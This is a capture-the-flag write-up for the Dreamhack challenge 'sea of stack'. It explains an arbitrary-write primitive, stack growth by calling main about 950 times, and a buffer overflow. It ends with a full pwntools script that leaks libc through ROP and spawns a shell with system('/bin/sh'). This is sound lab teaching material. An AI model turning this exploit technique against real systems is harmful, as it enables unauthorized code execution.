---
title: "Dreamhack - sea of stack"
date : 2026-01-13 00:00:00 +0900
categories: [Pwnable, Wargame, Dreamhack, Level4]
tags : [arbitrary write, stack expansion, manual stack growth, rop, libc leak]
---

## Dreamhack - sea of stack

## Overview 

prob: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c7eb981539ac1a21409a6da15c0f09d8e512a8bd, for GNU/Linux 3.2.0, not stripped

libc.so.6: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=69389d485a9793dbe873f0ea2c93e02efaa9aa3d, for GNU/Linux 3.2.0, stripped

### menu

    If you really want to give me a present, bring me that kind detective's heart.
    > 

Two global function pointers:
- `safe` (0x404010) - points to safe_func
- `unsafe` (0x404018) - points to unsafe_func

## Vulnerable

### main
```c
undefined8 main(void)
{
  int iVar1;
  undefined8 local_38;
  undefined8 *local_30;
  char input [28];
  int local_c;
  
  proc_init();
  printf("If you really want to give me a present, bring me that kind detective\'s heart.\n> ");
  read_input(input,16);
  iVar1 = strcmp(input,"Decision2Solve");
  if ((iVar1 == 0) && (gotPresent == 0)) {
    read_input(&local_30,8);  // target address
    read_input(&local_38,6);  // value to write
    *local_30 = local_38;     // arbitrary write
    gotPresent = 1;
  }
  print_menu();
  local_c = read_number();
  if (local_c == 1) {
    (*(code *)safe)();
  }
  else if (local_c == 2) {
    (*(code *)unsafe)();
  }
  return 0;
}
```

When input matches "Decision2Solve" and `gotPresent` is 0, we get a single arbitrary write primitive. We can write 6 bytes to any address.

### unsafe_func
```c
void unsafe_func(void)
{
  undefined1 local_28 [32];
  
  read_input(local_28,0x10000);
  return;
}
```

Buffer overflow with 0x10000 bytes into a 32-byte buffer. However, `read_input` blocks until it receives the full requested size, which would normally overflow past the stack boundary and crash.

## Exploitation Strategy

### Step 1: Arbitrary Write to Create Loop

Use the arbitrary write to overwrite `safe` (0x404010) with `main`'s address. This allows us to call main repeatedly by selecting option 1.

### Step 2: Stack Expansion

Each call to main allocates 0x30+ bytes on the stack (local variables). By calling main ~950 times through the modified `safe` pointer, we expand the stack significantly:

    950 iterations × ~0x30 bytes ≈ 0x1B8C0 bytes of stack space

This provides enough room to accommodate the 0x10000 byte read in `unsafe_func` without crashing.

### Step 3: ROP Chain for Libc Leak

After sufficient stack expansion, call `unsafe_func` (option 2) and overflow with a ROP chain to leak libc:

    payload = padding(0x28) + pop_rdi_rsi + puts@got + puts@got + puts@plt + unsafe_func

Returning to `unsafe_func` allows us to send another payload after leaking.

### Step 4: Final ROP for Shell

With libc base calculated, send second payload:

    payload = padding(0x28) + pop_rdi_rsi + binsh + binsh + ret + system

A standalone `ret` gadget is inserted before calling `system` to ensure 16-byte stack alignment.  
Without this, `system` may crash due to `movaps` instructions used internally by glibc.

## Exploit
```python
from pwn import *
import time

p = remote('host8.dreamhack.games', 14534)
e = ELF("prob")
libc = ELF("libc.so.6")

# Stack expansion loop
for i in range(950):
    if i % 100 == 0:
        print(i)
    p.sendafter(">", "Decision2Solve\x00\n")
    
    if i == 0:
        # Arbitrary write: safe = main
        p.sendline(b'\x10\x40\x40\x00\x00\x00\x00')  # &safe
        p.sendline(b'\x4a\x14\x40\x00\x00')          # main addr
    
    p.sendlineafter(">", "1")  # call safe() -> main()

# Trigger overflow
p.sendlineafter('>', b'a' * 15)
p.sendlineafter(">", "2")

pop_2 = 0x40129b  # pop rdi; pop rsi; ret
unsafe = 0x401426

# Stage 1: Leak libc
pay = b'a' * 0x28
pay += p64(pop_2)
pay += p64(e.got['puts'])
pay += p64(e.got['puts'])
pay += p64(e.plt['puts'])
pay += p64(unsafe)
pay = pay.ljust(0x10000, b'\x00')
p.send(pay)

time.sleep(0.2)
p.recv(1)
libc_puts = u64(p.recvn(6) + b'\x00' * 2)
libc_main = libc_puts - libc.sym['puts']
log.info(f'libc base: {hex(libc_main)}')

# Stage 2: system("/bin/sh")
binsh = libc_main + 0x1d8698
system = libc_main + libc.sym['system']

pay = b'b' * 0x28
pay += p64(pop_2)
pay += p64(binsh)
pay += p64(binsh)
pay += p64(0x40101a)  # ret gadget for stack alignment
pay += p64(system)
pay = pay.ljust(0x10000, b'\x00')
p.send(pay)

p.interactive()
```



![exploit](/assets/img/posts/dreamhack/seaofstack/1.png)